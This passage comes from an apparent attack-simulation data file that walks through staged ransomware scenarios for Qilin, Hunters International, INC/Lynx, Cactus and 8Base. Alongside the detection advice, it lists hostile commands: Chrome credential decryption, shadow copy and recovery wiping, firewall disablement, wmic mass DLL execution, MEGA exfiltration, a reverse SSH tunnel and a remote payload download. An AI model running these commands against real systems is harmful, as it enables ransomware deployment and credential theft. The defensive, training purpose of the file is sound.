          'After compromising a Domain Controller, Qilin affiliates create a Group Policy Object linking a PowerShell logon script (`\\\\corp.local\\SYSVOL\\corp.local\\scripts\\logon.ps1`). Whenever any domain user logs in, the script copies `%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data` and `Local State`, decrypts the AES-GCM master key via `ProtectedData::Unprotect` under the user’s own session context, and writes the cleartext credentials to a staging share.',
        activeNodes: ['attacker', 'firewall', 'target', 'siem'],
        mitreTactic: 'Credential Access (T1555.003 - Credentials from Web Browsers / T1484.001)',
        technicalCommands: [
          'GPO Logon Script: powershell.exe -ExecutionPolicy Bypass -File \\\\corp.local\\SYSVOL\\corp.local\\scripts\\logon.ps1',
          '[System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, \'CurrentUser\') -> Dump Chrome Login Data SQLite to \\\\DC01\\Temp$\\creds.txt',
        ],
        defenseMitigation:
          'Monitor Active Directory EventID 5136 for `gPCMachineExtensionNames` / `gPCUserExtensionNames` script modifications and PowerShell ScriptBlock EventID 4104 accessing `Google\\Chrome\\User Data\\Local State`.',
        logs: [
          {
            id: 'qilin-1',
            timestamp: '05:03:19.440',
            source: 'PowerShell',
            severity: 'critical',
            EventCode: 4104,
            ProcessName: 'powershell.exe',
            raw: 'EventID: 4104 | ScriptBlockText: Copy-Item "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data" ... [System.Security.Cryptography.ProtectedData]::Unprotect(...) | OutputShare: \\\\DC01\\Temp$\\creds.txt',
            parsedFields: {
              Technique: 'GPO-Driven Mass Browser Credential Harvesting (Sophos X-Ops)',
              TargetArtifacts: 'Chrome/Edge Login Data SQLite + Local State DPAPI Key',
              MitreId: 'T1555.003 (Credentials from Web Browsers)',
            },
          },
        ],
        packets: [],
      },
      {
        id: 2,
        title: 'Stage 2: Credential-Authenticated Share Mounting (`-d`), Service Termination & VSS Wipe',
        narration:
          'Using the harvested domain and vCenter/ESXi credentials, the operator invokes the Rust-compiled Qilin binary with `-d DOMAIN\\Admin:Password` (which calls `WNetAddConnection2W` to automatically authenticate and mount inaccessible remote shares), stops 60+ backup and database services (`veeam`, `sql`, `msexchange`), and deletes Volume Shadow Copies.',
        activeNodes: ['target', 'siem'],
        mitreTactic: 'Lateral Movement & Defense Evasion (T1021.002 / T1489 / T1490)',
        technicalCommands: [
          'qilin_rust.exe -d "CORP\\svc_backup:P@ssw0rd2026!" -p "\\\\10.10.0.0/16"',
          'net.exe stop VeeamBackupSvc /y && vssadmin.exe delete shadows /all /quiet',
        ],
        defenseMitigation:
          'Disable password saving in enterprise browsers for privileged accounts via Group Policy (`PasswordManagerEnabled = 0`) and monitor rapid `WNetAddConnection2W` SMB logons (EventID 4624 Type 3).',
        logs: [
          {
            id: 'qilin-2',
            timestamp: '05:08:42.815',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'qilin_rust.exe',
            CommandLine: 'C:\\Windows\\Temp\\qilin_rust.exe -d CORP\\svc_backup:*** --safeboot',
            raw: 'EventID: 1 | Image: C:\\Windows\\Temp\\qilin_rust.exe | Language: Rust (Qilin / Agenda v2) | Action: WNetAddConnection2W auto-mount + 64 Services Stopped + VSS Deleted',
            parsedFields: {
              AutoMountSwitch: '-d DOMAIN\\User:Password (WNetAddConnection2W)',
              TerminatedServices: 'VeeamBackupSvc, MSSQLSERVER, MSExchangeIS, Sophos',
            },
          },
        ],
        packets: [],
      },
      {
        id: 3,
        title: 'Stage 3: Simultaneous Windows & ESXi Hypervisor ChaCha20 / AES-256-GCM Encryption (`.qilin`)',
        narration:
          'Qilin executes its configurable per-affiliate encryption profile (supporting ChaCha20 or AES-256-GCM with RSA-4096 key wrapping and configurable skip-step intermittent modes) across both Windows servers and VMware ESXi datastores (`/vmfs/volumes`), appending the custom `.qilin` extension and writing `[extension]-README-RECOVER.txt`.',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Impact (T1486 - Data Encrypted for Impact)',
        technicalCommands: [
          './qilin_esxi --path /vmfs/volumes --kill-vms (Terminates ESXi VMX worlds & encrypts .vmdk/.vmx)',
          'qilin_rust.exe -> Encrypts Windows shares with ChaCha20 + RSA-4096 -> *.qilin & QILIN-README-RECOVER.txt',
        ],
        defenseMitigation:
          'Enforce hardware-backed FIDO2 MFA on vCenter/ESXi, disable ESXi SSH (`TSM-SSH`) by default, and isolate backup repositories from Active Directory.',
        logs: [
          {
            id: 'qilin-3',
            timestamp: '05:14:10.305',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 11,
            ProcessName: 'qilin_rust.exe',
            raw: 'EventID: 11 | Image: C:\\Windows\\Temp\\qilin_rust.exe | TargetFilename: \\\\corp-fs01\\data\\QILIN-README-RECOVER.txt | Cipher: ChaCha20 / AES-256 + RSA-4096 | ESXiTarget: /vmfs/volumes/*.vmdk',
            parsedFields: {
              RansomwareFamily: 'Qilin (Agenda Ransomware-as-a-Service)',
              CrossPlatformTargets: 'Windows x64 + VMware ESXi ELF64',
              RansomNote: 'QILIN-README-RECOVER.txt',
            },
          },
        ],
        packets: [],
      },
    ],
  },
  {
    id: 'hunters-international-hive-rust-wsus-sharpwmi',
    title: 'CISA AA22-321A, Unit 42 & Sophos — Hunters International Ransomware: Hive Rust Lineage, SharpWMI Lateral Movement & COM IVssBackupComponents Shadow Deletion',
    category: 'RANSOMWARE_EXTORTION',
    mitreId: 'T1486',
    description:
      'Grounded in CISA AA22-321A (Hive Rust lineage), Palo Alto Networks Unit 42, and Sophos research on Hunters International: after acquiring the Hive ransomware source code, Hunters International streamlined the Rust encryptor to delete Volume Shadow Copies directly via the COM `IVssBackupComponents::DeleteSnapshots` API (evading command-line `vssadmin.exe` alerts), propagate via `SharpWMI.exe` / Cobalt Strike, and encrypt enterprise storage.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Hunters International Operator (Cobalt Strike)', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'SharpWMI / SMB Lateral Distribution', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Windows Server (COM IVssBackupComponents)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'Unit 42 / Sophos VSS COM API Sensor', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'Encrypted Volumes (.locked + Contact Us.txt)', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: SharpWMI Remote Execution & Backup Catalog Destruction (`wbadmin`)',
        narration:
          'Operating from a compromised administrative workstation, Hunters International operators use `SharpWMI.exe` (`action=exec`) and Impacket `wmiexec.py` to stage the Rust-compiled encryptor across target servers, disabling Windows Defender real-time monitoring and deleting system state backup catalogs.',
        activeNodes: ['attacker', 'firewall', 'target'],
        mitreTactic: 'Lateral Movement & Defense Evasion (T1047 - WMI / T1562.001)',
        technicalCommands: [
          'SharpWMI.exe action=exec computername=srv-db01.corp.local command="C:\\ProgramData\\hunters.exe"',
          'wbadmin.exe DELETE SYSTEMSTATEBACKUP -keepVersions:0 -quiet && bcdedit.exe /set {default} recoveryenabled No',
        ],
        defenseMitigation:
          'Monitor `wmiprvse.exe` spawning child binaries from `C:\\ProgramData` (Sysmon EventID 1) and enable Tamper Protection on all Windows Server endpoints.',
        logs: [
          {
            id: 'hunters-1',
            timestamp: '06:10:14.120',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'hunters.exe',
            CommandLine: 'C:\\ProgramData\\hunters.exe',
            raw: 'EventID: 1 | ParentImage: C:\\Windows\\System32\\wbem\\wmiprvse.exe | Image: C:\\ProgramData\\hunters.exe | Language: Rust (Hunters International / Hive v6 Derivative)',
            parsedFields: {
              LateralMovement: 'SharpWMI / WMI Win32_Process.Create (wmiprvse.exe)',
              CodeLineage: 'Hive v6 Rust Source Code -> Hunters International',
            },
          },
        ],
        packets: [],
      },
      {
        id: 2,
        title: 'Stage 2: Direct COM `IVssBackupComponents::DeleteSnapshots` API Call (Commandless VSS Wipe)',
        narration:
          'To evade SIEM rules that watch for `vssadmin.exe delete shadows` or `wmic.exe shadowcopy delete`, the Hunters International Rust binary initializes COM (`CoCreateInstance` for `CLSID_VssBackupComponents` in `vssapi.dll`) and invokes `IVssBackupComponents::DeleteSnapshots` directly in-process to silently destroy all Volume Shadow Copies.',
        activeNodes: ['target', 'siem'],
        mitreTactic: 'Impact & Defense Evasion (T1490 - Inhibit System Recovery via Native COM API)',
        technicalCommands: [
          'CoCreateInstance(CLSID_VssBackupComponents, ..., IID_IVssBackupComponents, &pVss)',
          'pVss->InitializeForBackup(NULL) -> pVss->DeleteSnapshots(SnapshotId, VSS_OBJECT_SNAPSHOT, TRUE, &lDeleted, &idNonDeleted)',
        ],
        defenseMitigation:
          'Hunt for non-system binaries loading `C:\\Windows\\System32\\vssapi.dll` (Sysmon EventID 7) and correlate with Volume Shadow Copy Service (`VSS`) EventID 8220 / System EventID 7036.',
        logs: [
          {
            id: 'hunters-2',
            timestamp: '06:10:18.550',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 7,
            ProcessName: 'hunters.exe',
            raw: 'EventID: 7 | Image: C:\\ProgramData\\hunters.exe | ImageLoaded: C:\\Windows\\System32\\vssapi.dll | ApiCall: IVssBackupComponents::DeleteSnapshots(VSS_OBJECT_SNAPSHOT, bForceDelete=TRUE) | Note: Commandless VSS deletion bypassing vssadmin.exe',
            parsedFields: {
              EvasionTechnique: 'In-Process COM IVssBackupComponents::DeleteSnapshots',
              LoadedModule: 'C:\\Windows\\System32\\vssapi.dll (Sysmon EventID 7)',
              MitreTechnique: 'T1490 (Inhibit System Recovery)',
            },
          },
        ],
        packets: [],
      },
      {
        id: 3,
        title: 'Stage 3: Multi-Threaded Rust Encryption & Free-Space Wiping (`.locked` / `Contact Us.txt`)',
        narration:
          'Unlike Hive’s custom dual-key table cipher, Hunters International simplifies the encryption pipeline for speed and reliability, terminating processes holding file locks, encrypting files in parallel Rust worker threads, appending `.locked`, and dropping `Contact Us.txt` in every directory.',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Impact (T1486 - Data Encrypted for Impact)',
        technicalCommands: [
          'hunters.exe (Rust Tokio/Rayon thread pool encrypts local & mounted volumes -> *.locked)',
          'WriteFile("Contact Us.txt") containing victim negotiation portal ID and Tor .onion URLs',
        ],
        defenseMitigation:
          'Block outbound Tor traffic at the perimeter and enforce Sysmon EventID 7 + EventID 11 correlation to terminate processes that load `vssapi.dll` and immediately perform rapid file renames.',
        logs: [
          {
            id: 'hunters-3',
            timestamp: '06:14:02.890',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 11,
            ProcessName: 'hunters.exe',
            raw: 'EventID: 11 | Image: C:\\ProgramData\\hunters.exe | TargetFilename: E:\\Shares\\Engineering\\Contact Us.txt | EncryptedExtension: .locked | Family: Hunters International',
            parsedFields: {
              RansomwareFamily: 'Hunters International',
              RansomNote: 'Contact Us.txt',
              FileExtension: '.locked',
            },
          },
        ],
        packets: [],
      },
    ],
  },
  {
    id: 'inc-ransom-lynx-citrix-netscaler-wmic-mega',
    title: 'Palo Alto Unit 42, Huntress & SentinelOne — INC Ransom & Lynx: Citrix NetScaler Exploitation, wmic.exe Distributed DLL Execution & MEGASync Double Extortion',
    category: 'RANSOMWARE_EXTORTION',
    mitreId: 'T1486',
    description:
      'Grounded in Palo Alto Networks Unit 42, Huntress, and SentinelOne analyses of INC Ransom and its direct successor Lynx (which shares the INC Ransom C++ codebase): affiliates breach edge appliances (Citrix NetScaler CVE-2023-3519 / Ivanti), exfiltrate data via `MEGASync.exe` and `rclone`, and distribute the ransomware DLL across the domain via `wmic.exe /node:@"hosts.txt" process call create "rundll32.exe C:\\Windows\\Temp\\inc.dll,Main"`.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'INC Ransom / Lynx Operator (MEGASync Exfil)', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'Citrix NetScaler / Edge VPN Foothold', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Admin Host (wmic.exe /node:@hosts.txt)', type: 'workstation', status: 'compromised' },
      { id: 'siem', label: 'Unit 42 / Huntress EDR & WMI Sensor', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'Domain Endpoints (rundll32 inc.dll -> .INC / .LYNX)', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Edge Appliance Compromise, NetScan Discovery & MEGASync Cloud Exfiltration',
        narration:
          'Pivoting from an exploited Citrix NetScaler ADC or VPN appliance, INC Ransom/Lynx operators enumerate all active domain computers into `C:\\Windows\\Temp\\hosts.txt` using `netscan.exe` and exfiltrate sensitive shares directly to MEGA cloud storage using `MEGAcmd` / `MEGASync.exe`.',
        activeNodes: ['attacker', 'firewall', 'target'],
        mitreTactic: 'Discovery & Exfiltration (T1046 / T1567.002 - Exfiltration to Cloud Storage)',
        technicalCommands: [
          'netscan.exe /range:10.10.0.1-10.10.255.254 /save:C:\\Windows\\Temp\\hosts.txt',
          'mega-put.bat "D:\\Finance_Archive" /INC_Dump_2026 (Uploads via *.mega.co.nz TLS API)',
        ],
        defenseMitigation:
          'Block outbound connections to consumer cloud storage APIs (`*.mega.co.nz`, `*.userstorage.mega.co.nz`) from server VLANs and monitor `netscan.exe` execution.',
        logs: [
          {
            id: 'inc-1',
            timestamp: '07:02:19.304',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 22,
            ProcessName: 'MEGAcmdServer.exe',
            raw: 'EventID: 22 | Image: C:\\Users\\admin\\AppData\\Local\\MEGAcmd\\MEGAcmdServer.exe | QueryName: g.api.mega.co.nz | HostList: C:\\Windows\\Temp\\hosts.txt',
            parsedFields: {
              ExfiltrationClient: 'MEGAcmdServer.exe / MEGASync.exe',
              DestinationDomain: 'g.api.mega.co.nz',
              TargetHostList: 'C:\\Windows\\Temp\\hosts.txt',
            },
          },
        ],
        packets: [],
      },
      {
        id: 2,
        title: 'Stage 2: Mass WMIC `/node:@"hosts.txt"` DLL Distribution & `rundll32.exe` Execution',
        narration:
          'After copying the ransomware DLL (`inc.dll` or `lynx.dll`) to `\\\\<host>\\C$\\Windows\\Temp\\` across every IP in `hosts.txt`, the operator executes a single `wmic.exe` command that remotely spawns `rundll32.exe` on every machine in the enterprise simultaneously.',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Lateral Movement & Execution (T1047 - WMI / T1218.011 - Rundll32)',
        technicalCommands: [
          'wmic.exe /node:@"C:\\Windows\\Temp\\hosts.txt" /user:"CORP\\DomainAdmin" /password:"***" process call create "rundll32.exe C:\\Windows\\Temp\\inc.dll,Main --fast"',
        ],
        defenseMitigation:
          'Block `wmic.exe /node:` remote process creation across workstation and server subnets via Windows Firewall (DCOM port 135) and alert on `wmiprvse.exe` spawning `rundll32.exe`.',
        logs: [
          {
            id: 'inc-2',
            timestamp: '07:06:44.712',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'wmic.exe',
            CommandLine: 'wmic.exe /node:@"C:\\Windows\\Temp\\hosts.txt" process call create "rundll32.exe C:\\Windows\\Temp\\inc.dll,Main --fast"',
            raw: 'EventID: 1 | Image: C:\\Windows\\System32\\wbem\\WMIC.exe | CommandLine: wmic /node:@"C:\\Windows\\Temp\\hosts.txt" process call create "rundll32.exe C:\\Windows\\Temp\\inc.dll,Main --fast"',
            parsedFields: {
              MassDeploymentCommand: 'wmic.exe /node:@"hosts.txt" process call create',
              DllLoader: 'rundll32.exe C:\\Windows\\Temp\\inc.dll,Main',
              MitreTechnique: 'T1047 (WMI) + T1218.011 (Rundll32)',
            },
          },
        ],
        packets: [],
      },
      {
        id: 3,
        title: 'Stage 3: AES-128-CTR + Curve25519 Encryption, Wallpaper Change & Network Printer Ransom Notes',
        narration:
          'Both INC Ransom and Lynx encrypt files using AES-128-CTR paired with Curve25519 elliptic-curve key exchange (`.INC` or `.LYNX`), change the Windows desktop wallpaper to the ransom notice, and call `EnumPrintersW` + `WritePrinter` to automatically print the physical ransom note on every connected office network printer.',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Impact (T1486 - Data Encrypted for Impact / T1491.001 - Internal Defacement)',
        technicalCommands: [
          'rundll32.exe C:\\Windows\\Temp\\lynx.dll,Main (AES-128-CTR + Curve25519 encryption -> *.LYNX & README.txt)',
          'winspool.drv!EnumPrintersW() -> OpenPrinterW() -> WritePrinter(hPrinter, szRansomNote, ...)',
        ],
        defenseMitigation:
          'Monitor `rundll32.exe` loading unsigned DLLs from `C:\\Windows\\Temp` and detect anomalous `winspool.drv` raw print jobs initiated by non-spooler processes.',
        logs: [
          {
            id: 'inc-3',
            timestamp: '07:10:05.190',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 11,
            ProcessName: 'rundll32.exe',
            raw: 'EventID: 11 | Image: C:\\Windows\\System32\\rundll32.exe | TargetFilename: C:\\Users\\Public\\INC-README.txt | PhysicalPrinterOutput: WritePrinter invoked on 14 network printers | Cipher: AES-128-CTR + Curve25519',
            parsedFields: {
              RansomwareFamily: 'INC Ransom / Lynx (Shared C++ Source Code)',
              PrinterExtortion: 'EnumPrintersW + WritePrinter physical ransom note printing',
              EncryptedExtension: '.INC / .LYNX',
            },
          },
        ],
        packets: [],
      },
    ],
  },
  {
    id: 'cactus-ransomware-qlik-sense-ssh-batch-unpacker',
    title: 'Kroll, Arctic Wolf & CISA KEV — Cactus Ransomware: Qlik Sense Exploitation (CVE-2023-41265), Chisel SSH Tunneling & AES Batch-Driven Self-Decryption (.cts1)',
    category: 'RANSOMWARE_EXTORTION',
    mitreId: 'T1486',
    description:
      'Grounded in Kroll, Arctic Wolf, and Trend Micro incident response investigations into Cactus ransomware: operators exploit Qlik Sense (CVE-2023-41265 / CVE-2023-41266) or Fortinet VPN appliances, establish persistent SSH backdoors via Scheduled Tasks, and deploy a unique self-decrypting binary that cannot execute unless a batch script passes the `-i <32_byte_hex_AES_key>` switch to decrypt `ntuser.dat` in memory (`-r` runtime flag, `.cts1`).',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Cactus Operator (Chisel + OpenSSH C2)', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'Qlik Sense Server (scheduler.exe RCE)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Batch Unpacker (7z.exe + -i AES Key)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'Kroll / Arctic Wolf DFIR & Sysmon Sensor', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'Encrypted Enterprise Shares (.cts1 / cAcTuS.readme.txt)', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Qlik Sense Tunneling RCE (CVE-2023-41265) & Persistent OpenSSH Scheduled Task',
        narration:
          'Cactus operators exploit HTTP request tunneling and path traversal in Qlik Sense Enterprise (`CVE-2023-41265` and `CVE-2023-41266`), causing `scheduler.exe` to spawn `cmd.exe` and `powershell.exe`. They immediately register a Scheduled Task that runs a persistent reverse SSH connection (`sshd.exe` / `ssh.exe -R`) back to their C2 server.',
        activeNodes: ['attacker', 'firewall', 'target'],
        mitreTactic: 'Initial Access & Persistence (T1190 / T1053.005 / T1572)',
        technicalCommands: [
          'C:\\Program Files\\Qlik\\Sense\\Scheduler\\scheduler.exe -> cmd.exe /c powershell.exe -enc ...',
          'schtasks.exe /create /tn "Updates" /tr "C:\\ProgramData\\ssh.exe -N -R 2222:127.0.0.1:3389 user@198.51.100.42" /sc minute /mo 5 /ru SYSTEM',
        ],
        defenseMitigation:
          'Patch Qlik Sense against CVE-2023-41265/41266/46507 and alert immediately if `Qlik\\Sense\\Scheduler\\scheduler.exe` spawns `cmd.exe`, `powershell.exe`, or `curl.exe`.',
        logs: [
          {
            id: 'cactus-1',
            timestamp: '08:15:04.221',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'powershell.exe',
            CommandLine: 'powershell.exe -nop -w hidden -c "Invoke-WebRequest http://198.51.100.42/7z.msi -OutFile C:\\ProgramData\\7z.msi"',
            raw: 'EventID: 1 | ParentImage: C:\\Program Files\\Qlik\\Sense\\Scheduler\\scheduler.exe | Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe | Exploit: CVE-2023-41265 / CVE-2023-41266',
            parsedFields: {
              ExploitedService: 'Qlik Sense Scheduler (scheduler.exe)',
              VulnerabilityIds: 'CVE-2023-41265 & CVE-2023-41266',
              PersistenceTask: 'Scheduled Task "Updates" running reverse SSH tunnel',
            },
          },
        ],
        packets: [],
      },
      {
        id: 2,
        title: 'Stage 2: PsExec Batch Staging, `7z.exe` Extraction & `-i` AES Key Self-Decryption (`ntuser.dat`)',
        narration:
          'Using a custom PowerShell sprayer (`s.ps1`) and `psexec.exe`, the operator drops a password-protected 7-Zip archive onto target hosts, extracts it with `7z.exe`, deletes the archive, and launches the Cactus binary with `-i <64_hex_AES_key>`. The binary reads the encrypted payload from `C:\\ProgramData\\ntuser.dat`, decrypts it in memory using the `-i` AES-256 key, and re-launches itself with the `-r` runtime flag.',
        activeNodes: ['target', 'siem'],
        mitreTactic: 'Defense Evasion & Execution Guardrails (T1140 - Deobfuscate/Decode Files / T1480)',
        technicalCommands: [
          'C:\\ProgramData\\7z.exe x C:\\ProgramData\\pack.7z -p"Cactus2026!" -oC:\\ProgramData\\ -y',
          'C:\\ProgramData\\cactus.exe -i 4A9F2C8E1D7B0A3F5E6C8B1D2E3F4A5B6C7D8E9F0A1B2C3D4E5F6A7B8C9D0E1F (Decrypts ntuser.dat -> spawns cactus.exe -r)',
        ],
        defenseMitigation:
          'Hunt for binaries launched with `-i <64-hex-chars>` followed by child process creation of the same binary with `-r` or `-f` flags, and monitor `C:\\ProgramData\\ntuser.dat` creation.',
        logs: [
          {
            id: 'cactus-2',
            timestamp: '08:21:38.609',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'cactus.exe',
            CommandLine: 'C:\\ProgramData\\cactus.exe -i 4A9F2C8E1D7B0A3F5E6C8B1D2E3F4A5B6C7D8E9F0A1B2C3D4E5F6A7B8C9D0E1F',
            raw: 'EventID: 1 | Image: C:\\ProgramData\\cactus.exe | CommandLine: cactus.exe -i <32-byte-AES-key> | EncryptedDatFile: C:\\ProgramData\\ntuser.dat | ReLaunchFlag: cactus.exe -r',
            parsedFields: {
              AntiAnalysisMechanism: 'Requires -i 32-byte hex AES key to decrypt C:\\ProgramData\\ntuser.dat',
              ExecutionStages: '-s (setup) -> -i (decrypt ntuser.dat) -> -r (runtime encryption)',
            },
          },
        ],
        packets: [],
      },
      {
        id: 3,
        title: 'Stage 3: Multi-Stream Micro-Read Encryption (`.cts0` -> `.cts1`) & `cAcTuS.readme.txt`',
        narration:
          'Running under the `-r` flag, Cactus renames target files to `.cts0` while actively encrypting them in small micro-streams (preventing file-lock race conditions) and renames them to `.cts1` upon completion while dropping `cAcTuS.readme.txt`.',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Impact (T1486 - Data Encrypted for Impact)',
        technicalCommands: [
          'C:\\ProgramData\\cactus.exe -r (Renames file -> *.cts0 during AES/RSA encryption -> *.cts1 on completion)',
          'WriteFile("cAcTuS.readme.txt") across all local and network directories',
        ],
        defenseMitigation:
          'Configure EDR ransomware canary traps to trigger on `.cts0` / `.cts1` file extensions and `cAcTuS.readme.txt` creation.',
        logs: [
          {
            id: 'cactus-3',
            timestamp: '08:25:12.440',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 11,
            ProcessName: 'cactus.exe',
            raw: 'EventID: 11 | Image: C:\\ProgramData\\cactus.exe | CommandLine: cactus.exe -r | TargetFilename: D:\\Shares\\cAcTuS.readme.txt | ExtensionProgression: .cts0 (in-flight) -> .cts1 (encrypted)',
            parsedFields: {
              RansomwareFamily: 'Cactus Ransomware',
              TwoPhaseExtension: '.cts0 (active stream) -> .cts1 (completed)',
              RansomNote: 'cAcTuS.readme.txt',
            },
          },
        ],
        packets: [],
      },
    ],
  },
  {
    id: 'eightbase-phobos-smoke-loader-process-hacker',
    title: 'CISA AA24-045A & Cisco Talos — 8Base / Phobos Ransomware: SmokeLoader Delivery, Process Hacker (kprocesshacker.sys) Service Kill & AES-256 Encryption (.8base)',
    category: 'RANSOMWARE_EXTORTION',
    mitreId: 'T1486',
    description:
      'Grounded in CISA/FBI/MS-ISAC Joint Cybersecurity Advisory AA24-045A (#StopRansomware: Phobos / 8Base Ransomware) and Cisco Talos research: 8Base affiliates deliver a customized Phobos ransomware payload via SmokeLoader and SystemBC, use Process Hacker (`kprocesshacker.sys`) and batch scripts to kill security/backup services and wipe shadow copies, and encrypt files with AES-256 + RSA-1024 appending `.id[<id>].[support@8base.vc].8base`.',
    NodesGenerator: () => [
      { id: 'attacker', label: '8Base / Phobos Operator (SmokeLoader + SystemBC)', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'ProcessHacker.exe (kprocesshacker.sys)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Windows Server (vssadmin + bcdedit + firewall off)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'CISA AA24-045A / Talos EDR Sensor', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'Enterprise Shares (.8base + info.hta)', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: SmokeLoader / SystemBC SOCKS5 Proxy & Process Hacker (`kprocesshacker.sys`) Staging',
        narration:
          '8Base affiliates gain initial access via exposed RDP or phishing attachments delivering `SmokeLoader` (which injects into `explorer.exe`), establish a persistent `SystemBC` Tor/SOCKS5 backdoor, and deploy `ProcessHacker.exe` (`kprocesshacker.sys`) alongside ` HRSword` / `GMER` to terminate endpoint antivirus and EDR agents.',
        activeNodes: ['attacker', 'firewall', 'target', 'siem'],
        mitreTactic: 'Initial Access & Defense Evasion (T1055 / T1562.001 / T1068)',
        technicalCommands: [
          'explorer.exe (Injected SmokeLoader payload downloads SystemBC SOCKS5 proxy & Phobos/8Base loader)',
          'sc.exe create KProcessHacker2 binPath= "C:\\Users\\Public\\kprocesshacker.sys" type= kernel && sc.exe start KProcessHacker2',
        ],
        defenseMitigation:
          'Block `kprocesshacker.sys` via Microsoft Vulnerable Driver Blocklist and monitor `explorer.exe` initiating outbound connections to unusual IP addresses.',
        logs: [
          {
            id: '8base-1',
            timestamp: '09:04:12.118',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 6,
            ProcessName: 'ProcessHacker.exe',
            raw: 'EventID: 6 | ImageLoaded: C:\\Users\\Public\\kprocesshacker.sys | InvokingProcess: ProcessHacker.exe | PrecedingLoader: SmokeLoader in explorer.exe + SystemBC | Advisory: CISA AA24-045A',
            parsedFields: {
              InitialLoader: 'SmokeLoader + SystemBC SOCKS5 Backdoor',
              KernelDriverAbused: 'kprocesshacker.sys (Process Hacker 2 Driver)',
              AdvisoryId: 'CISA AA24-045A (#StopRansomware: Phobos / 8Base)',
            },
          },
        ],
        packets: [],
      },
      {
        id: 2,
        title: 'Stage 2: UAC Bypass, Windows Firewall Disablement (`netsh`) & Shadow Copy / Boot Recovery Wipe',
        narration:
          'The Phobos/8Base payload copies itself to `%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup` and `HKLM\\...\\Run` for persistence, disables the Windows Firewall via `netsh advfirewall set allprofiles state off`, and executes `vssadmin`, `wmic`, `wbadmin`, and `bcdedit` in a tight loop to prevent system recovery.',
        activeNodes: ['target', 'siem'],
        mitreTactic: 'Defense Evasion & Impact Preparation (T1562.004 - Disable Firewall / T1490)',
        technicalCommands: [
          'vssadmin.exe delete shadows /all /quiet && wmic.exe shadowcopy delete',
          'bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures && bcdedit.exe /set {default} recoveryenabled no',
          'netsh.exe advfirewall set allprofiles state off',
        ],
        defenseMitigation:
          'Alert on sequential execution of `vssadmin delete shadows`, `bcdedit /set {default} recoveryenabled no`, and `netsh advfirewall set allprofiles state off` within a 5-second window.',
        logs: [
          {
            id: '8base-2',
            timestamp: '09:06:31.509',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'netsh.exe',
            CommandLine: 'netsh.exe advfirewall set allprofiles state off',
            raw: 'EventID: 1 | ParentImage: C:\\Users\\Public\\phobos_8base.exe | Image: C:\\Windows\\System32\\netsh.exe | CommandLine: netsh advfirewall set allprofiles state off | PrecedingCommands: vssadmin delete shadows + bcdedit recoveryenabled no',
            parsedFields: {
              FirewallModification: 'netsh advfirewall set allprofiles state off',
              RecoveryInhibition: 'vssadmin + wmic shadowcopy + wbadmin + bcdedit',
              StartupPersistence: 'Startup Folder + HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',
            },
          },
        ],
        packets: [],
      },
      {
        id: 3,
        title: 'Stage 3: Phobos AES-256-CBC Encryption, `.8base` Extension Rename & `info.hta` HTML Application Note',
        narration:
          '8Base encrypts all non-system files using AES-256-CBC (encrypting files under 1.5 MB completely and larger files partially before protecting the per-victim AES key with an embedded RSA-1024 public key), renames files to `<filename>.id[<8_hex_id>].[support@8base.vc].8base`, and launches `mshta.exe C:\\info.hta` to display a full-screen extortion notice.',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Impact (T1486 - Data Encrypted for Impact / T1218.005 - Mshta)',
        technicalCommands: [
          'phobos_8base.exe -> Encrypts files with AES-256-CBC + RSA-1024 -> *.id[A1B2C3D4].[support@8base.vc].8base',
          'mshta.exe "C:\\Users\\Public\\info.hta" (Displays HTML Application ransom demand)',
        ],
        defenseMitigation:
